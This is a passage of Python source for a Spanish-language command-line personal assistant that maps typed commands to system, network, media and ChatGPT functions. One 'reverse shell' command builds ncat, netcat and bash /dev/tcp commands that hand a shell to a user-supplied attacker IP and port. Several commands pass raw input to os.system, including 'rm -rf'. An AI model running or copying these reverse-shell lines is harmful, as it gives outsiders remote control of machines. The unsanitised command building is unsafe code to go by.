                    # Función para imprimir ayuda específica
                    def print_specific_help(command):
                        if command in help_dict:
                            print(f"{Fore.LIGHTYELLOW_EX} > {Fore.LIGHTGREEN_EX}{command.ljust(25, ' ')} {help_dict[command]}\n")
                        else:
                            print(f"No se ha encontrado ayuda para el comando {command}.\n")
                    
                    # Verificar si se proporciona un argumento de ayuda
                    for command in help_dict:
                        if command in saludo and helpcommand in saludo:
                            print_specific_help(command)              

                    #clean screen with Enter key
                    if saludo == "":
                        limpieza()
                        
                    if saludo != "":
                        print('\n')
                        
                    #comunicación 
                    saludos = ('Hola', 'hola', 'oli', 'Holi', 'Hey', 'hey', "que pasa", "buenas", "encantado")
                    for i in saludos:
                        if saludo == i:
                            saludos_hola = ('Hola', 'hola', 'oli', 'Holi', 'Hey', 'hey')
                            for i in saludos_hola:
                                if saludo == i:
                                    limpieza()
                                    saludos = ('Buenos dias', 'Como estas hoy?','Contento de que estes aquí', 'Hey!', 'Hey que pasa?', 'Buenas señor', 'Que tal estás jefe?', 'Como te encuentras hoy?')
                                    random_key = random.sample(saludos, 1)[0]
                                    print("\n"+Style.NORMAL + Fore.YELLOW + random_key + " ｡◕ ‿ ◕ ｡\n\n\n")
                                    if platform.system() == 'Linux':
                                         print(str(random_key))                          
                                    elif platform.system() == 'Windows':
                                         hablar(random_key)
          
        
                    preguntas = {'que eres', 'quien eres', 'que eres?', 'quien eres?'}
                    for i in preguntas:
                        if saludo == i:
                            limpieza()          
                            if platform.system() == 'Linux':
                                print(Style.NORMAL + Fore.YELLOW + "Soy un programa en desarrollo constante para la práctica y obtención de conocimiento a través de la ya comentada práctica constante\n\n\n")                          
                            elif platform.system() == 'Windows':
                                hablar("Soy un programa en desarrollo constante para la práctica y obtención de conocimiento a través de la ya comentada práctica constante")


                    #ps
                    if saludo == 'ps':
                        subprocess.run('ps', shell=True)
                    #Whoami
                    if saludo == 'whoami':
                        subprocess.run('whoami', shell=True)
                    
                    #elevate
                    if saludo == 'elevate' or saludo == 'root':
                        if platform.system()=='Windows':
                            elevate.elevate()
                        elif platform.system()=='Linux':
                            try:
                                subprocess.run('sudo cp -r ~/C0d3x /root 2>/dev/null & sudo su', shell=True)
                            except:
                                continue
                    #delete dirs
                    if 'rm -rf' in saludo or 'rmdir' in saludo:
                        if platform.system() == 'Windows':
                            saludo = saludo.replace('rmdir ','')
                            saludo = saludo.replace('rm -rf ','')
                            os.system('rmdir /s ' + str(saludo))                           
                        elif platform.system() == 'Linux':
                            saludo = saludo.replace('rm -rf ','')
                            saludo = saludo.replace('del -d ','')
                            os.system('rm -rf ' + str(saludo))
                    #Show the actives conections
                    if  saludo == 'conex':
                        if platform.system() == 'Windows':
                            subprocess.run('netstat -ano', shell=True)
                        else:
                            subprocess.run('ss -tuln', shell=True)
                    
                    #teacher
                    if saludo == 'teacher':
                        teacher()

                    #show files content
                    if 'cat' in saludo or 'type' in saludo:

                        if platform.system() == 'Windows':

                            if 'cat' in saludo:
                                saludo = saludo.replace('cat ','')
                            elif 'type' in saludo:
                                saludo = saludo.replace('type ','')
                            #formatos    
                            if '.py' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'python')
                            elif '.bat' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'batch')
                            elif '.sh' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'bash')
                            elif '.js' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'javascript')
                            elif '.html' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'html')
                            elif '.css' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'css')
                            elif '.php' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'php')
                            elif '.xml' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'xml')
                            elif '.txt' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'text')
                            elif '.rb' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'ruby')
                            elif '.java' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'java')
                            else:
                                os.system('\ntype ' + str(saludo) + '\n')
                            
                            

                        elif platform.system() == 'Linux':
                            print(random_key_colour + '[!] ' + random_key_colour2 + 'Instalando Bat!')
                            os.system('sudo apt install bat')
                            os.system('mkdir -p ~/.local/bin && ln -s /usr/bin/batcat ~/.local/bin/bat')
                            saludo = saludo.replace('bat ','')
                            os.system('bat ' + str(saludo) + "\n")

                    #delete files
                    if 'rm' == saludo[0:2] or 'del' in saludo[0:2]:
                        if platform.system() == 'Windows':
                            saludo = saludo.replace('del ','')
                            os.system('del ' + str(saludo))
                        elif platform.system() == 'Linux':
                            saludo = saludo.replace('rm ','')
                            os.system('rm ' + str(saludo))

                    #Colour
                    if saludo == 'colours':
                        cleanColour()

                    #Alarma
                    if 'alarma' in saludo:
                        alarma()

                    #os details
                    if saludo == 'os':
                        if platform.system() == "Linux":
                            print(Fore.LIGHTGREEN_EX + "UNIX OS\n")
                            print('Version ' + str(platform.release()))
                        elif platform.system() == "Windows":
                            print(Fore.LIGHTBLUE_EX + "MICROSOFT OS\n")
                            speak('Windows' + str(platform.release()))
                            print('Windows ' + str(platform.release()))
                        elif platform.system() == "Mac":
                            print(Fore.LIGHTYELLOW_EX + "APPLE OS\n")
                            speak('Apple os')
                        elif os.path.exists('/data/data/com.termux/'):
                             print('TERMUX')   
                             print('Android ' + str(platform.release()))
                        else:
                            print(Fore.LIGHTRED_EX + "No info about os")

                    #host4live
                    if saludo == 'host4live':
                        host4alive()

                    #Videoconvert
                    if saludo == 'videoconvert':
                        try:
                            def convertir_video_a_audio(video_path, audio_path):
                                video = VideoFileClip(video_path)
                                audio = video.audio
                                audio.write_audiofile(audio_path)

                            # Ruta del archivo de video de entrada y salida de audio
                            archivo_video = input('Introduce el archivo de video>')
                            videoformats = ['.mp4', '.mkv', '.mov', '.flv']
                            for i in videoformats:
                                if i in str(archivo_video):
                                    archivo_video1 = archivo_video.replace(i, '')
                                    archivo_audio = str(archivo_video1) + "Audio.mp3"
                            # Llamada a la función para convertir el video a audio
                            convertir_video_a_audio(archivo_video, archivo_audio)
                        except:
                            print(random_key_colour + 'Something wrong happened with the Video Convert')
                            continue
 
                    # Obtener la IP pública
                    if saludo == 'public ip':
                        ip_publica = obtener_ip_publica()
                        print(Fore.LIGHTGREEN_EX + "La dirección IP pública es: " + Fore.LIGHTYELLOW_EX + ip_publica)
        
                    #show proccess
                    if saludo == 'proccess' or saludo  == 'procesos':
                        if windows:
                            subprocess.run('tasklist', shell=True)
                        elif linux:
                            subprocess.run('ps', shell=True)
                    
                    if saludo == 'proccess root' or saludo == 'procesos root':
                        if windows:
                            subprocess.run("tasklist /v /fi 'USERNAME ne NT AUTHORITY\SYSTEM'", shell=True)
                        elif linux:
                            subprocess.run('ps -a', shell=True)
                    
                    #close proccess
                    if saludo[0:6] == 'cerrar':
                        close_proc(saludo[7:])

                    #Interfaces information
                    if 'interfaces' in saludo:
                        if platform.system() == 'Windows':
                            subprocess.run('powershell -Command "Get-NetAdapter"', shell=True)

                        elif platform.system() == 'Linux':
                            subprocess.run('ip addr', shell=True)  
                    #macchanger
                    if 'macchanger' in saludo:

                        lista = ('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8','9','0','1','2','1','2','3','4','5','6','7','8','9','0','3','4','5','6','7','8','9','0','1','2','3','4','5','6','7','8','9','0')
                        lista2 = ('0E','0A','06', '02')
                        randomlist1 = random.sample(lista,1)[0]
                        randomlist2 = random.sample(lista,1)[0]
                        randomlist3 = random.sample(lista,1)[0]
                        randomlist4 = random.sample(lista,1)[0]
                        randomlist5 = random.sample(lista2,1)[0]

                        mac1 = str(randomlist1)
                        mac2 = str(randomlist2)
                        mac3 = str(randomlist3)
                        mac4 = str(randomlist4)
                        mac5 = str(randomlist5)
                        randommaclinux = mac5 + ':' + mac3 + mac4 + ':' + mac3 + mac2 + ':' + mac4 + mac1 + ':' + mac1 + mac3 + ':' + mac2 + mac4
                        randommacwindows = mac5 + '-22-33-44-55-66'
                        
                        print(Fore.LIGHTRED_EX + '[º]' + Fore.LIGHTGREEN_EX + 'Selecciona una interfaz para el cambio de mac:\n')
                        if platform.system() == "linux":
                            subprocess.run('ifconfig', shell=True)
                        elif platform.system() == "Windows":
                            subprocess.run('powershell -Command "Get-NetAdapter"', shell=True)
                        interface=input('\nInterfaz>')

                        if platform.system() == "linux":
                            subprocess.call(["ifconfig", interface, "down"])
                            subprocess.run("ifconfig " + interface + " hw ether " + str(randommaclinux), shell=True)
                            subprocess.call(["ifconfig", interface, "up"])
                            print(Fore.LIGHTYELLOW_EX + '\n[+]' + Fore.LIGHTGREEN_EX + "Mac address changed to: " + Fore.LIGHTRED_EX + str(randommaclinux) + '\n')

                        elif platform.system() == 'Windows':
                            randommacW = randommacwindows
                            randommacwindows = "'" + randommacwindows + "'"
                            interfacewindows = "'" + interface + "'"
                            Macchange = '| Set-NetAdapter -MacAddress ' + randommacwindows + '"'
                            subprocess.call('powershell -Command "Get-NetAdapter ' + interfacewindows + ' ' + Macchange)
                            checkmac = 'powershell -Command "Get-NetAdapter ' + interfacewindows + '"'
                            out = subprocess.Popen(str(checkmac), stdout=subprocess.PIPE, shell=True)
                            (out, err) = out.communicate()
                            if str(randommacW) in str(out):
                                print(Fore.LIGHTYELLOW_EX + '\n[+]' + Fore.LIGHTGREEN_EX + "Mac address changed to: " + Fore.LIGHTRED_EX + str(randommacwindows) + '\n')
                            else:
                                print(Fore.LIGHTRED_EX + '\n[-]' + Fore.LIGHTGREEN_EX + 'Ha ocurrido algún error.'+ '\n')
                            
                            
                    #Email
                    if saludo == "email":
                        selectionemail = input("Do you want to send or check emails? Send[1], Check[2] = ")

                        send = ("send", "1")
                        for i in send:
                            if i in selectionemail:
                                email_send()

                        show = ("show", "2")
                        for i in show:
                            if i in selectionemail:
                                email_show()
                    
                    englishs = ('English', 'english', 'ingles', 'Ingles', 'English mode', 'english mode', 'mode english')
                    if saludo in englishs:
                        limpieza()
                        BucleEnglish()
                    
                    #Random 
                    if saludo == 'Azar' or saludo == '?' or saludo == '??':
                        def random_quest():
                            randomques=input('¿?Que quieres preguntar¿?\n>')
                            if randomques:
                               randomsthings=('Si por supuesto', 'No, que va', 'Puede', 'Da igual', 'Si, porque no?', 'Venga, si')
                               print(random.sample(randomsthings,1)[0])
                               random_continue=input('¿Quieres preguntar otra cosa? (y/n)')
                               if random_continue == 'y' or random_continue == '':
                                random_quest()
                               else:
                                print('')
                        random_quest()
                    exit
                    
                    #check DNS status
                    if saludo == 'check dns':
                        def get_dns_servers():
                            dns_servers = []
                            # Obtener el código de página predeterminado del sistema
                            encoding = sys.getdefaultencoding()
                            # Ejecutar el comando ipconfig en la terminal de Windows
                            output = subprocess.check_output(['ipconfig', '/all'], shell=True).decode(encoding, errors='ignore')
                            # Buscar las líneas que contienen las direcciones DNS
                            lines = output.split('\n')
                            for i in range(len(lines)):
                                if 'Servidores DNS' in lines[i]:
                                    parts = lines[i].split(':')
                                    if len(parts) >= 2:
                                        dns_servers.extend(parts[1].strip().split(', '))
                            return dns_servers
                        # Obtener la lista de servidores DNS
                        encoding = sys.getdefaultencoding()
                        output = subprocess.check_output(['ipconfig', '/all'], shell=True).decode(encoding, errors='ignore')
                        # Buscar las líneas que contienen las direcciones DNS
                        lines = output.split('\n')
                        for i in range(len(lines)):
                            if 'Servidores DNS' in lines[i]:
                                parts = lines[i].split(':')
                                dns2=lines[i+1].strip()  # Línea siguiente
                        dns_servers = get_dns_servers()
                        # Imprimir los servidores DNS
                        if dns_servers:
                            print("Servidores DNS:")
                            for server in dns_servers:
                                print(server + ' - ' + dns2)
                        else:
                            print("No se encontraron servidores DNS configurados.")


                    #change dns
                    if saludo[0:10] == 'change dns':
                        import wmi
                        def get_network_interfaces():
                            c = wmi.WMI()
                            interfaces = c.Win32_NetworkAdapterConfiguration(IPEnabled=True)
                            return [interface.Description for interface in interfaces]
                        # Get the list of network interfaces
                        network_interfaces = get_network_interfaces()
                        # Print the available network interfaces
                        for interface in network_interfaces:
                            interface=interface
                        def change_dns_address(interface_name, dns_servers):
                            # Connect to WMI
                            c = wmi.WMI()
                            # Find the network interface
                            interfaces = c.Win32_NetworkAdapterConfiguration(IPEnabled=True)
                            target_interface = None
                            for interface in interfaces:
                                if interface.Description == interface_name:
                                    target_interface = interface
                                    break
                            if target_interface is None:
                                print(f"Network interface '{interface_name}' not found.")
                                return
                            # Set the DNS servers
                            dns = target_interface.DNSServerSearchOrder
                            dns_servers = list(dns_servers)  # Convert to list if not already
                            return_value = target_interface.SetDNSServerSearchOrder(DNSServerSearchOrder=dns_servers)
                            if return_value[0] == 0:
                                print(f"DNS servers changed successfully: {dns_servers}")
                            else:
                                print("Failed to change DNS servers. Maybe try as administrator.")
                        # Specify the interface name and the new DNS server
                        interface_name = str(interface)  # Replace with your interface nam
                        dns_servers = [saludo[11:18], saludo[19:26]]  # Replace with your desired DNS servers
                        # Change the DNS servers
                        change_dns_address(interface_name, dns_servers)

                    #reverseshell
                    if saludo == 'reverse shell':
                        def reverse():
                            import socket
                            ip_attacker=input(Fore.LIGHTRED_EX + 'Introduce la ip atacante' + Fore.LIGHTBLUE_EX + '(Desde donde te quieres conectar)' + Fore.LIGHTRED_EX + ': ' + Fore.LIGHTGREEN_EX)
                            port_attacker=input(Fore.LIGHTRED_EX + 'Introduce el puerto atacante: ' + Fore.LIGHTGREEN_EX)
                            port_attacker1=int(port_attacker)
                            if platform.system() == 'Windows':
                                limpieza()
                                subprocess.run('ncat ' + str(ip_attacker) + ' ' + str(port_attacker) + ' -e cmd.exe', shell=True)
                            elif platform.system() == 'Linux':
                                limpieza()
                                try:
                                    subprocess.run('netcat ' + str(ip_attacker) + ' ' + str(port_attacker) + ' -e /bin/bash', shell=True)
                                except:
                                    subprocess.run('bash -i >& /dev/tcp/' + str(ip_attacker) + '/' + str(port_attacker) + ' 0>&1', shell=True)
                                if os.path.exists('/data/data/com.termux/'):
                                    subprocess.run('apt install nmap-ncat && apt autoremove && ncat ' + str(ip_attacker) + ' ' + str(port_attacker) + ' -e /data/data/com.termux/files/usr/bin/bash', shell=True)
                                else:
                                    subprocess.run('bash -i >& /dev/tcp/' + str(ip_attacker) + '/' + str(port_attacker) + ' 0>&1', shell=True)
                        try:
                            reverse()
                        except ValueError:
                            continue
                        
                    #crypto
                    if saludo == 'crypto':
                        async def get_price(symbol):
                            url = f"https://pro-api.coinmarketcap.com/v1/cryptocurrency/quotes/latest?symbol={symbol}&convert=USD" 
                            headers = {
                                "Accepts": "application/json",
                                "X-CMC_Pro_API_Key": ""
                            }
                            response = requests.get(url, headers=headers).json()
                            return response["data"][symbol]["quote"]["USD"]["price"]
                        async def main():
                            symbols = ["BTC", "ETH", "XRP", "LTC", "BCH", "DOGE", "SOL"]
                            tasks = [asyncio.ensure_future(get_price(symbol)) for symbol in symbols]
                            prices = await asyncio.gather(*tasks)

                            for symbol, price in zip(symbols, prices):
                                print(Fore.LIGHTYELLOW_EX + '\n[' + Fore.LIGHTGREEN_EX + '+' + Fore.LIGHTYELLOW_EX + ']' + Fore.LIGHTMAGENTA_EX + "The current price of " + Fore.LIGHTGREEN_EX + str(symbol) + Fore.LIGHTMAGENTA_EX + " is " + Fore.LIGHTGREEN_EX + str("{:.4f}".format(price)) + '$\n')
                        asyncio.run(main())

                    #Mp3
                    if saludo == 'mp3':

                        filesmp4 = fnmatch.filter(os.listdir(os.getcwd()), "*.mp4")
                        filesmp3 = fnmatch.filter(os.listdir(os.getcwd()), "*.mp3")
                        allfiles = filesmp3 + filesmp4
                        print(random_key_colour + "     {}:{} \n".format(dt.hour, dt.minute) + random_key_colour2 + "MP3 " + random_key_colour3 + str(random_key_face))
                        selectionmusic = input(Fore.LIGHTGREEN_EX + '\n¿Quieres reproducir o descargar música?' + Fore.LIGHTBLUE_EX + '(1 or 2)\n' + Fore.LIGHTMAGENTA_EX + '>')
                        if selectionmusic == '1':
                            
                            try:
                               
                                
                                mp3 = str(filesmp3).replace("[]","").replace(']',"").replace('[',"").replace(", ","\n").replace("'","")
                                mp4 = str(filesmp4).replace("[]","").replace(']',"").replace('[',"").replace(", ","\n").replace("'","")
                                mps = mp3 + mp4

                                def play():
                                    print('Selecciona la canción que quieres reproducir > ' + os.getcwd())
                                    print('\nMusic album:\n' + str(filesmp3).replace("[]","").replace(']',"").replace('[',"").replace(", ","\n").replace("'","") + str(filesmp4).replace("[]","").replace(']',"").replace('[',"").replace(", ","\n").replace("'",""))
                                    music = input('¿Que canción vas a reproducir? >')
                                    matched_files = fnmatch.filter(os.listdir(os.getcwd()), f'*{music}*{i}')
                                    if music == '':
                                        if platform.system() == 'Windows':
                                            print(random.sample(allfiles, 1)[0])
                                            webbrowser.open(random.sample(allfiles, 1)[0])
                                        elif platform.system() == 'Linux':
                                            print(random.sample(allfiles, 1)[0])
                                            os.system('pip install mpv > /dev/null 2>&1')
                                            os.system('mpv "' + random.sample(mp4, 1)[0] + '" > /dev/null 2>&1 &')
                                    elif matched_files:
                                        matched_file = matched_files[0]
                                        if platform.system() == 'Windows':
                                            webbrowser.open(matched_file)
                                            print(random_key_colour + 'Para parar la música introdúceme > pause\nPara reproducirla > play' + random_key_face)
                                        

                                        elif platform.system() == 'Linux':
                                            os.system('pip install mpv > /dev/null 2>&1')
                                            os.system('mpv "' + matched_file + '" > /dev/null 2>&1 &')
                                        
                                formats = ('.mp3','.mp4')
                                for i in formats:
                                    if i in mps:
                                        play()
                                    
                                    
                                if mps == '':
                                    limpieza()
                                    print(Fore.LIGHTRED_EX + '[!] No hay archivos mp3 o mp4 en el directorio actual, cambia de directorio o descarga canciones con la opción 2.\n')

                                
                                              
                            except:
                                continue

                            
                        elif selectionmusic == '2':

                            try:
                                url = input(random_key_colour + 'Introduce la canción que quieres descargar y reproducir (url youtube)\n>')
                                yt = YouTube(str(url)) 
                                download_Video(yt)
                                titulo_coma = yt.title.replace("'","")
                                titulo_barra = titulo_coma.replace("/","")
                                titulo = titulo_barra.replace("|","")
                                audiomp3 = titulo + '.mp4'

                            except RemoteDisconnected:
                               print(Fore.LIGHTRED_EX + '[!]' + Fore.LIGHTGREEN_EX + ' Error al intentar conectar coon el servior remoto')
                               BucleEspanol()
                            except KeyError:
                                print(Fore.LIGHTRED_EX + '[!]' + Fore.LIGHTGREEN_EX + ' Error al intentar leer la canción introducida')
                                BucleEspanol()
                            except:
                                print(Fore.LIGHTRED_EX + '[!]' + Fore.LIGHTGREEN_EX + ' Error al intentar descargar el audio')
                                BucleEspanol()

                           


                    pauseplay = ('pause', 'play')
                    if saludo in pauseplay:
                            if 'termux' in os.getcwd():
                                subprocess.run('pkill mpv', shell=True)
                                continue
                            elif os.getcwd() != 'termux':
                                keyboard_.press(KeyCode.from_vk(0xB3))  # Play/Pause

                    #mkir
                    if 'mkdir' in saludo:
                        os.mkdir(str(saludo[6:]))


                    #screenshot 
                    if os.path.exists('/data/data/com.termux/'):
                        pass
                    else:
                        if saludo == 'screenshot' or saludo == 'captura':
                            if os.path.exists('screenshot.png'):
                                i = 1
                                while i <= 10:
                                    filename = f'screenshot{i}.png'
                                    if not os.path.exists(filename):
                                        os.rename('screenshot.png', filename)
                                        print(f'Image name changed to {filename}')
                                        imagen = pyautogui.screenshot()
                                        imagen.save('screenshot.png')
                                        print('\nScreenshot saved')
                                        break
                                    i += 1
                                else:
                                  print('Cannot capture more than 10 screenshots')
                                                                             
                                                                        
                            else:
                                imagen = pyautogui.screenshot()
                                imagen.save('screenshot.png')   

                    #screenshot naming
                        elif '.png' in saludo:
                            imagen = pyautogui.screenshot()
                            imagen.save(str(saludo[11:]))                                  
                                
                    
                    #open
                    ejecute = '.\ '
                    ejecute2 = ejecute.replace(' ', '')
                    if 'open' in saludo:
                        os.system(str(ejecute2) + saludo[5:])
                    elif str(ejecute2) in saludo or './' in saludo:
                        os.system(str(ejecute2) + saludo[2:])

                    #cleanMemDns
                    if saludo == 'dns':
                        if platform.system() == 'Windows':
                            os.system('ipconfig /flushdns')
                        elif platform.system() == 'Linux':
                            subprocess.call(['sudo', 'systemctl', 'restart', 'network-manager'])
                        elif distro_name == 'Ubuntu':
                            subprocess.call(['sudo', 'service', 'network-manager', 'restart'])

                    #Searchsploit
                    if 'searchsploit' in saludo:
                        if platform.system() == 'Linux':
                            saludo = saludo.replace('searchsploit ', '')
                            os.system('searchsploit ' + saludo)

                        elif platform.system() == 'Windows':
                            saludo = saludo.replace('searchsploit ', '')
                            os.system('searchsploit ' + saludo)
                            if os.system('searchsploit ' + saludo) == 1:
                                limpieza()
                                print('Ha ocurrido un error, comprueba que searchsploit está instalado')

                        else:
                            print("\n")
        
                    #ps
                    if saludo == 'ps':
                        if platform.system() == 'Windows':
                            subprocess.run('tasklist')
                            
                        else:
                            subprocess.run('ps', shell=True)
                    #ps 1 task
                    if saludo[0:5] == 'ps -p':
                        process1=str(saludo[6:])
                        if platform.system() == 'Windows':
                            subprocess.run('tasklist /fi "PID eq ' + process1 + '"')
                            
                        else:
                            subprocess.run('ps -p ' + process1, shell=True)
                            
                    #Voice
                    if saludo == 'voz':
                        if platform.system() == 'Windows':
                            signal.signal(signal.SIGINT, def_handler)
                        if platform.system() == 'Linux':
                            print("Voz no funcional para linux de momento")
                            sys.exit(1)
                        
                        hablar('Te escucho')
                        def bucle_voice():
                            while True:
                                try:
                                    hablar('Modo voz no disponible')
                                    BucleEspanol()
                                    #VoiceSpanish()
                                
                                except UnboundLocalError:
                                    limpieza()
                                    continue
                        while True:
                            bucle_voice()            

                    if UnboundLocalError == True:
                        continue

                    #Nmap  
                    if 'nmap' in saludo[0:5]:
                        try:
                            print(Fore.LIGHTGREEN_EX + 'Examples >' + Fore.LIGHTWHITE_EX + '[IP = 127.0.0.1 ] - [OPTIONS = -Pn -n -sSC -oN Scans]')
                            saludo = saludo.replace('nmap ','')
                            subprocess.call(["nmap", saludo]) 
                            print("\n")

                        except KeyboardInterrupt:
                            BucleEspanol()

                    #shutdown
                    if 'shutdown' in saludo:
                        if 'now' in saludo:
                            if platform.system() == 'Windows':
                                subprocess.run('shutdown /s /f', shell=True)
                            elif platform.system() == 'Linux':
                                subprocess.run('shutdown now', shell=True)
                        elif 'shutdown -t' in saludo:
                            if platform.system() == 'Windows':
                                seconds=saludo[11:]
                                subprocess.run('shutdown /s /f /t' + seconds, shell=True)
                            elif platform.system() == 'Linux':
                                seconds=saludo[11:]
                                subprocess.run('sleep' + seconds + ' && shutdown -h now', shell=True)
                        elif '-r' in saludo and '-t' in saludo:
                            if platform.system() == 'Windows':
                                seconds=saludo[14:]
                                subprocess.run('shutdown /r /f /t' + seconds, shell=True)
                            elif platform.system() == 'Linux':
                                seconds=saludo[14:]
                                subprocess.run('sleep' + seconds + ' && shutdown -r now', shell=True)
                        elif saludo == 'shutdown -r':
                            if platform.system() == 'Windows':
                                subprocess.run('shutdown /r /f', shell=True)
                            elif platform.system() == 'Linux':
                                subprocess.run('shutdown -r now', shell=True)
                                
                    #chatGPT
                    if saludo == 'gpt':
                        while True:
                          try:
                            #API
                            client = OpenAI(api_key='')
                            prompt = input(random_key_colour2 + '⦿ ' + random_key_colour + 'ChatGPT' + random_key_colour2 + ' ⦿ ' + random_key_colour + '¿Que puedo hacer por ti? (Go back = exit)\n>' + Fore.LIGHTGREEN_EX)
                            completion = client.chat.completions.create(model="gpt-3.5-turbo", messages=[{"role": "user", "content": str(prompt)}])
                            print(completion.choices[0].message.content)
                            print("\n")

                            if prompt == 'exit':
                                break
                            elif prompt == 'clean' or prompt == 'clear':
                                limpieza()
                                continue
                            elif prompt == '' or prompt == ' ':
                                limpieza()
                                continue
                            
                          except openai.AuthenticationError:
                            print(random_key_colour + 'Algo ha ocurrido con la API, compruebalo.\n')
                            continue
                          except openai.RateLimitError:
                            print(random_key_colour + 'Algo ha salido mal, comprueba la API o intentelo de nuevo.\n')
                            continue


                    #Console commands
                    
                    #pwd
                    if saludo == 'pwd':
                        if  platform.system() == 'Linux':
                            print("\n")
                            subprocess.run("pwd", shell=True)
                        elif platform.system() == 'Windows':
                            subprocess.run("echo %cd% ", shell=True)
                            print("\n")

                    #copy all in actual directory
                    if 'cp all' in saludo or 'copy all' in saludo:
                        if  platform.system() == 'Linux':
                            print("\n")
                            shutil.copytree(os.getcwd(), 'gold')
                            print('The gold is in the bag!')
                        elif platform.system() == 'Windows':
                            shutil.copytree(os.getcwd(), 'gold')
                            print("\n")
                            print('The gold is in the bag!')
                        
                    #cd
                    elif 'cd ' in saludo:
                        try:
                            os.chdir(saludo[3:])
                        except OSError:
                            continue
                    
                    #ls
                    ls_dir = {'ls', 'dir'} 
                    for i in ls_dir:
                        if saludo == i:
                            if platform.system() == 'Linux':
                                subprocess.run("ls", shell=True)
                                continue

                    for i in ls_dir:
                        if saludo == i:
                            if platform.system() == 'Windows':
                                subprocess.run("dir", shell=True)
                                continue
                    #python script launcher
                    if 'run ' in saludo:
                        saludo = '/' + saludo[4:] 
                        try:
                            pwd1 = subprocess.Popen('cd', stdout=subprocess.PIPE, shell=True)
                            (out, err) = pwd1.communicate()
                            out1 = str(out[3:-2]).replace("'",'')
                            out2 = str(out1[1:]).replace('\\', "/")
                            out3 = str(out2).replace('//', '/')
                            print('start wt.exe python C:/' + out3 + saludo)
                            subprocess.run("start wt.exe python C:/" + out3 + saludo, shell=True)
                        except:
                            print(Fore.LIGHTRED_EX + 'This file is not on the actual directory.\n')

                    #ping
                    if saludo[4:] == 'ping':
                    
                        if platform.system() == 'Linux':
                            saludo = saludo.replace('ping ','')
                            subprocess.call(['ping -c1', str(saludo)])
                            continue
                        elif platform.system() == 'Windows':  
                            saludo = saludo.replace('ping ','')
                            subprocess.call(['ping',str(saludo)])
                            continue
        
                    #ifconfig, ipconfig
                    info_local = {'ifconfig' , 'ipconfig'}
                    for i in info_local:
                        if saludo == i:
                            if platform.system() == 'Linux':
                                subprocess.run('ifconfig', shell=True)
                                continue
                    for i in info_local:
                        if saludo == i:
                            if platform.system() == 'Windows':
                                subprocess.run("ipconfig", shell=True)
                                continue

                    #ip
                    ip = {'ip', 'dime la ip', 'cual es mi ip', 'que ip tengo', 'ip?'}
                    for i in ip:
                        if saludo == i:
                            try:
                                limpieza() 
                                import socket
                                hostname = socket.gethostname()
                                local_ip = str(socket.gethostbyname(hostname))
                                import pyperclip
                                pyperclip.copy(local_ip)
                                print(Fore.LIGHTBLUE_EX + "La ip local es "+ Fore.LIGHTGREEN_EX + local_ip +  " y se ha copiado en la clipboard")
                                continue
                              
                    		
                            except pyperclip.PyperclipException:
                                print(Fore.LIGHTYELLOW_EX + "Tu ip local es " + Fore.LIGHTGREEN_EX + local_ip + Fore.LIGHTYELLOW_EX + "  ｡◕ ‿ ◕ ｡\n")

                    #readspeaker
                    if saludo == 'speaker':
                        print(Fore.LIGHTCYAN_EX + '+' + 'Introduce algún dato y te lo canto: ')

                        if platform.system() == 'Windows':
                            subprocess.run('notepad.exe input.txt', shell=True)
                        elif platform.system() == 'Linux':
                            subprocess.run('nano input.txt', shell=True)
                        enter = input(Fore.LIGHTGREEN_EX + 'Press ENTER')
                        if enter == ' ' or enter == '':
                            try:
                                print('hello')
                                with open('input.txt','r') as file:
                                    info = file.read()
                                    hablar(info)
                            except FileNotFoundError:
                                print('File not found.')
                            except TypeError:
                                continue
                            

                    #Mode console
                    if saludo == 'console':
                        print(Fore.LIGHTBLUE_EX + 'Mode console ' + Fore.LIGHTGREEN_EX + 'ON' + Fore.LIGHTBLUE_EX + "\nComando" + Fore.LIGHTGREEN_EX + ' off ' + Fore.LIGHTBLUE_EX + 'para volver a C0d3x.')
                        while True:
                            command=input(pathcurrent + random_key_colour3 + '\n> ' + color_escojido)
                            if command == 'off':
                                print(Fore.LIGHTBLUE_EX + 'Mode console ' + Fore.LIGHTRED_EX + 'OFF')
                                break
                            elif command == '':
                                limpieza()
                                continue
                            #cd
                            elif 'cd ' in command:
                                try:
                                    os.chdir(command[3:])
                                except OSError:
                                    continue
                            else:
                                if platform.system() == 'Windows':
                                    subprocess.run('powershell.exe ' + str(command), shell=True)
                                    continue
                                else:
                                    subprocess.run(str(command), shell=True)
                                    continue

                    #terminal
                    if saludo == 'zsh':
                        subprocess.run('zsh', shell=True)
                    elif saludo == 'cmd':
                        subprocess.run('cmd', shell=True)
                    elif saludo == 'bash':
                        subprocess.run('bash', shell=True)
                    elif saludo == 'powershell':
                        subprocess.run('powershell', shell=True)
        	
                    
                      
              
                    voice_mode_ = ("modo voz", "voz", "modo voz")
                    for i in voice_mode_:
                        if i == saludo:
                            print('Modo voz no disponible')
                            BucleEspanol()
                            #VoiceSpanish()

                    #Update for unix
                    if saludo == "update":
                        if platform.system() == 'Linux':
                             subprocess.run("apt update", shell=True)
                    if saludo == "upgrade":
                        if platform.system() == 'Linux':
                            subprocess.run("apt upgrade", shell=True)

                    #Limpia pantalla
                    limpia = {'limpia', 'limpiame la pantalla', 'limpiame esto','limpia la consola', 'limpiame la consola'}
                    for i in limpia:
                        if saludo == i:
                             limpieza()

                    #whois
                    if saludo[0:int(len('whois'))] == 'whois':
                        import whois
                        def whosis():
                            def ip_whois(ip_address):
                                try:
                                    result = whois.whois(ip_address)
                                    print(result)
                                except Exception as e:
                                    print("Error al realizar la consulta WHOIS:", str(e))
                            # Ejemplo de uso
                            ip = input(Fore.LIGHTBLUE_EX + 'Introduce la ip\n' + Fore.LIGHTGREEN_EX + '>' + Fore.LIGHTYELLOW_EX)  # Ingresa la dirección IP que deseas consultar
                            ip_whois(ip)
                        whosis()

                    #Break
                    ko = {'sleep', 'duerme', 'exit', 'salir'}
